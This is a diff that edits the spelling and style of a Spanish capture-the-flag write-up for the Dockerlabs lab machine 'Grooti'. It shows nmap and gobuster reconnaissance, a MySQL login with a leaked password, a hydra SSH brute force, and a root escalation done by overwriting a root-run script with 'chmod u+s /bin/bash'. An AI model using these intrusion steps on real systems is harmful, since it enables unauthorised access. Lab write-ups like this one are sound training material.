@@ -1,17 +1,17 @@
 # 🖥️ Writeup - Grooti 
 
 **Plataforma:** Dockerlabs  
-**Dificultat:** Easy  
-**Sistema Operatiu:** Linux  
+**Dificultad:** Easy  
+**Sistema Operativo:** Linux  
 
 # INSTALACIÓN
 
-Descargamos el `.zip` de la maquina desde Dockerlabs a nuestro entorno y hacemos los siguientes pasos.
+Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
 ```bash 
 unzip grooti.zip
 ```
-La maquina esta descomprimida y solo falta montarla.
+La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh grooti.tar
@@ -42,11 +42,11 @@ Máquina desplegada, su dirección IP es --> 172.17.0.2
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
 ``` 
 
-La maquina esta desplegada. Cuando terminemos de hackearla, con un `Ctrl + C` nos eliminara la maquina para que no queden archivos residuales.
+Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
 # ESCANEO DE PUERTOS
 
-Haremos un escaneo general para ver que puertos estan abiertos y luego uno mas exhaustivo para ver información relevante sobre los servicios.
+A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
@@ -92,11 +92,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds
 ```
 
-Investigando la pagina web en el puerto 80 descubrimos un `README.txt` que contiene la contrasenya `password1` , aunque no sabemos a que usuario o servicio esta associada.
+Investigando la página web en el puerto 80 descubrimos un archivo `README.txt` que contiene la contraseña `password1`, aunque no sabemos a qué usuario o servicio está asociada.
 
 # GOBUSTER
 
-Vamos a investigar si hay mas directorios interesantes que nos puedan dar información extra.
+Vamos a investigar si existen más directorios interesantes que nos puedan aportar información adicional.
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,zip,php,txt,bak,sh -b 403,404 -t 60
@@ -128,17 +128,17 @@ Finished
 ===============================================================
 ```
 
-Vemos que aparte de los directorios `/imagenes` y `/archives` , donde encontramos el `README.txt` , hay un directorio llamado `/secret`.
+Además de los directorios `/imagenes` y `/archives`, donde encontramos el `README.txt`, vemos que hay un directorio llamado `/secret`.
 
-Entrando al directorio `/secret` encontramos una lista de usuarios del sistema: `grooti` , `rocket` y `Naia`.
+Al acceder al directorio `/secret` encontramos una lista de usuarios del sistema: `grooti`, `rocket` y `Naia`.
 
-Ademas, encontramos un boton para descargar un archivo de instrucciones llamado `instrucciones.txt`. Dentro de este encontramos el siguiente comando `mysql -u rocket -p -h 172.17.0.2 --ssl=0`.
+También hallamos un botón para descargar un archivo de instrucciones llamado `instrucciones.txt`. Dentro de este archivo se encuentra el siguiente comando:
 
-Tenemos el comando para acceder a la base de datos con el usuario rocket, y tenemos la contrasenya encontrada anteriormente, `password1`, asi que vamos a intentarlo.
-
-```bash 
+```bash
 mysql -u rocket -p -h 172.17.0.2 --ssl=0
-``` 
+```
+
+Ya tenemos el comando para acceder a la base de datos con el usuario rocket, y contamos con la contraseña encontrada anteriormente `password1`, así que vamos a intentarlo.
 
 Info:
 ```
@@ -152,7 +152,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 MySQL [(none)]> 
 ```
-Indagando en el mysql encontramos una base de datos llamada `files_secret` con una tabla llamada `rutas`. Dentro de ella encontramos unas rutas interesantes.
+Indagando en MySQL encontramos una base de datos llamada `files_secret` con una tabla llamada `rutas`. Dentro de ella aparecen rutas interesantes.
 
 Info:
 ```
@@ -167,7 +167,7 @@ MySQL [files_secret]> select * from rutas;
 +----+------------+---------------------------------+
 4 rows in set (0.000 sec)
 ```
-Esta ruta podria ser un directorio en la pagina web que antes no habiamos podido encontrar utilizando gobuster.
+Una de estas podría corresponder a un directorio de la página web que antes no habíamos podido localizar utilizando Gobuster.
 
 Y efectivamente, en `http://172.17.0.2/uprivate/secret` encontramos un formulario. Dicho formulario permite introducir un string de texto y un número del 1 al 100.
 
@@ -211,9 +211,9 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Vemos que la contrasenya era `password1` , como la que habiamos encontrado al principio.
+Vemos que la contrasenya es `password1` , la misma que habiamos encontrado al principio.
 
-Una vez descomprimido el `.zip` tenemos un archivo `.txt` que parece un diccionario de contrasenyas, asi que lo utilizaremos para intentar obtener acceso por ssh con uno de los 3 usuarios que habiamos encontrado antes.
+Una vez descomprimido el `.zip`, obtenemos un archivo `.txt` que parece un diccionario de contraseñas, así que lo utilizaremos para intentar obtener acceso por `SSH` con uno de los tres usuarios que habíamos identificado antes.
 
 ```bash
 hydra -L users.txt -P password16.txt ssh://172.17.0.2 -t 64
@@ -239,7 +239,7 @@ Tenemos la contrasenya del usuario `grooti` : `YoSoYgRoOt`
 
 # ESCALADA DE PRIVILEGIOS
 
-Una vez dentro, comprovamos permisos `sudo`, `SUID`, `Capabilities`.
+Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.
 
 ```bash 
 sudo -l
@@ -253,17 +253,18 @@ find / -perm -4000 -type f 2>/dev/null
 sudo getcap -r / 2>/dev/null
 ```
 
-Nada que indique una via de escalada. Vamos a ver que archivos podemos encontrar en el sistema.
+Nada que indique una vía clara de escalada. Vamos a comprobar qué archivos podemos encontrar en el sistema.
 
-El directorio `/tmp` contiene un archivo llamado `malicious.sh` , que crea logs temporales y los eliminina al cabo de 2 segundos.
+En el directorio `/tmp` hallamos un archivo llamado `malicious.sh`, el cual crea logs temporales y los elimina al cabo de 2 segundos.
 
-Si conseguimos modificar el contenido del archivo, probablemente podamos ejecutar codigo arbitrario para escalar privilegios.
+Si conseguimos modificar el contenido de este archivo, probablemente podremos ejecutar código arbitrario para escalar privilegios.
 
 ```bash
 printf '#!/bin/bash\nchmod u+s /bin/bash\n' > malicious.sh
 ```
-Hemos modificado el contenido del script para que de permisos SUID al binario `/bin/bash`. Ahora solo queda que esperemos unos segundos y probemos el comando /bin/bash -p , que nos deberia dar una shell de root.
+Hemos alterado el script para que otorgue permisos SUID al binario `/bin/bash`. Ahora solo queda esperar unos segundos y probar el comando `/bin/bash -p` , lo que debería proporcionarnos una shell con privilegios de root.
 
-Ya somos root! 
 
 ![alt text](../images/image-1.png)
+
+Ya somos root! 
